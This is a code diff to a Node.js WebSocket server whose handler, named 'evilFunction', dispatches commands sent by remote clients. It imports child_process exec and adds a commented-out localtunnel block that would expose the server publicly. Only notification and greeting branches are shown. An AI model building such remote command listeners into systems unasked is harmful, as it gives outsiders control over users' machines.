@@ -7,10 +7,10 @@ const exec = require ('child_process');
 const ws = require ('ws');
 const path = require ('path')
 const notifier = require ('node-notifier');
-const lt = require ('localtunnel')
+const lt = require ('localtunnel');
 
 const app = express()
-const port = 124
+const port = 3000
 
 app.use(express.static(path.join(__dirname, 'public')));
 
@@ -31,10 +31,20 @@ wss.on('connection', function connection(ws) {
   ws.on('message', function message(data) {
     evilFunction(data,ws);
   });
-
   ws.send("Hello ws client!")
 });
 
+// (async () => {
+//   const tunnel = await lt({ port: 3000 });
+
+//   // the assigned public url for your tunnel
+//   // i.e. https://abcdefgjhij.localtunnel.me
+//   console.log(tunnel.url);
+
+//   tunnel.on('close', () => {
+//     // tunnels are closed
+//   });
+// })();
 
 function evilFunction(data,ws){
     data = data.toString()
@@ -54,6 +64,8 @@ function evilFunction(data,ws){
     } else if(data[0] == 'notif'){
       console.log("Notif: " + data[1]);
       notifier.notify(data[1]);
+    } else if(data == 'hello'){
+      ws.send('Hello ws client')
     }
 }
 
